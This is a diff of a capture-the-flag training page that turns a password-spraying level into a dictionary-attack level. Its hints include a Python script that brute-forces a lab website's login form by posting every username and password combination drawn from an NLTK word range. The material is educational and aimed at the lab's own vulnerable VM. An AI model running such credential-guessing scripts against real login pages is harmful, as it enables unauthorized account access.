@@ -22,7 +22,7 @@
   <div class="level">
     <div style="padding-bottom:10px">
       <a class="levelbanner levelbutton" href="../..">&#8592</a>
-      <h2 class="levelbanner">websec/b1spray</h2>
+      <h2 class="levelbanner">websec/b3dict</h2>
     </div>
   </div>
   <br>
@@ -48,11 +48,11 @@
       <h3>Setup:</h3>
       <p>Your virtual environment must be active to use thunder.py:</p>
       <pre>source ../env-tctf/bin/activate</pre>
-      <pre>python3 thunder.py create websec/b1spray</pre>
+      <pre>python3 thunder.py create websec/b3dict</pre>
       <h3>Intro:</h3>
       <p>Creating this level will start a vulnerable website which we can use to attack.<br/>
-A list of possible user names and a list of most commonly used passwords downloaded from Internet are provided in scripts/b1.<br/>
-Use attack.py or write your own code to find valid credential of the website by sending requests of all combinations of username and password.
+A range of NLTK words list is generated when level starts. We know that user name and password of your vulnerable website are chosen within that word range. <br/>
+Use attack.py or write your own code to find valid credential.
       </p>
 
     </li>
@@ -63,61 +63,71 @@ Use attack.py or write your own code to find valid credential of the website by 
       <p>List the instances in the project.</p>
       <pre>gcloud compute instances list</pre>
       <P>You should be able to see two instances listed.
-      <p><b>b1-container-vm</b>: The application you will attack is running on this machine. (Take note of its EXTERNAL_IP and INTERNAL_IP)</p>
-      <p><b>b1-attack-instance</b>: We are going to launch attack from this instance.</p>
+      <p><b>b3-container-vm</b>: The application you will attack is running on this machine. (Take note of its EXTERNAL_IP and INTERNAL_IP)</p>
+      <p><b>b3-attack-instance</b>: We are going to launch attack from this instance.</p>
 
     </li>
     
     <li>
       <span>Hint 2</span>
       <p>Try browse website using EXTERNAL_IP in a browser </p>
-      <img src="../img/b1spray/login.png">
+      <img src="../img/b3dict/login.png">
       <p>Use Chrome webtool(f12) or Firefox debuggerto inspect the login form. </p>
-      <img src="../img/b1spray/ins.png">
+      <img src="../img/b3dict/ins.png">
       <p>We can find that the name attributes of text inputs in login page are 'username' and 'password'(we will use this information in our code later). </p>
     </li>
     
     <li>
       <span>Hint 3</span>
-      <p>Navigate to thunder-ctf/scripts/b1.</p>
+      <p>Navigate to thunder-ctf/scripts/b3.</p>
       <p>Take a look at attack.py and replace INTERNAL_IP/EXTERNAL_IP</p>
       <pre>
 import requests
-import itertools
+import nltk
+nltk.download('words')
+from nltk.corpus import words
 
-#possible usernames 
-unames=[uname.rstrip('\n') for uname in open('unames.txt','r')]
-#most commanly used passwords found online
-passwords=[password.rstrip('\n').strip() for password in open('passwords.txt','r')]
+#word range printed in start message and start/b3dict.txt
+#replace with [YOUR_BEGIN_INDEX:YOUR_END_INDEX+1]
+#python list slice list[begin:end)
+creds = words.words()[81003:81024]
 
-#url='http://YOUR_WEB_IP/login'
-url='http://10.138.0.58/login'
+#url='http://YOUR_INTERNAL_IP/login'
+url='http://10.138.0.60/login'
 
-#iterate over all combination of user names and passwords
-for u, p in itertools.product(unames,passwords):
-    #prepare data for post request
-    payload={'username':u,'password':p}
-    #send username and password through post method to web app url
-    post=requests.Session().post(url, data=payload)
-    #check if respond text contains invalid credentails
-    if 'Invalid credentials' not in  post.text:
-        #print valid username and password
-        print(u+' '+p)
+#iterate over dictionary list for user names
+for u in creds:
+        #iterate over dictionary list for passwords
+	for p in creds:
+		#prepare data for post request
+		payload={'username':u,'password':p}
+                #send username and password through post method to web app url
+		post=requests.Session().post(url, data=payload)
+                #check if respond text contains invalid credentails
+		if 'Invalid credentials' not in  post.text:
+			#print valid username and password
+			print(u+' '+p )
+
       </pre>
+      <p>Note:We use NLTK, because we know the credential is generated from NLTK and the level has a word range provided. You can use any dictionary to attack.</p>
     </li>
     
     <li>
       <span>Hint 4</span>
-      <p>If you want to attack from your local system which has pyhton installed. You can download scripts/b1 with the code below and use ENTERNAL_IP in your attack script</p>
-      <pre>cloudshell download scripts/b1/*</pre>
+      <p>If you want to attack from your local system which has pyhton installed. You can download scripts/b3 with the code below and use ENTERNAL_IP in your attack script</p>
+      <pre>cloudshell download scripts/b3/*</pre>
+      <p>You have to install python3, python-pip and pip install nltk before running the script </p>
       <p>or<br/></p>
       <p>If you want to use google cloud environment and avoid your account being suspended for suspicious activity, you need to launch attack with INTERNAL_IP from another instance.<br/>
-b1-attack-instance and b1-container-vm are created in the same VPC network, so they are allowed to communicate with each other via internal ips 
+b3-attack-instance and b3-container-vm are created in the same VPC network, so they are allowed to communicate with each other via internal ips 
       </p>
-      <p>Copy scripts/b1 from cloud shell into your attack instance </p>
-      <pre>gcloud compute scp --recurse scripts/b1/*  b1-attack-instance:~/</pre>
+      <p>Copy scripts/b3 from cloud shell into your attack instance </p>
+      <pre>gcloud compute scp --recurse scripts/b3/*  b3-attack-instance:~/</pre>
       <p>SSH into your attack instance </p>
-      <pre>gcloud compute ssh b1-attack-instance</pre>
+      <pre>gcloud compute ssh b3-attack-instance</pre>
+      <p>Install nltk </p>
+      <pre>sudo apt install python-pip
+pip install nltk</pre>
     </li>
     
     <li>
@@ -130,7 +140,7 @@ b1-attack-instance and b1-container-vm are created in the same VPC network, so t
     <li>
       <span>Hint 6</span>
       <p>Try if you can login with printed credential in a web browser </p>
-      <img src="../img/b1spray/wel.png">
+      <img src="../img/b3dict/wel.png">
 
     </li>
     
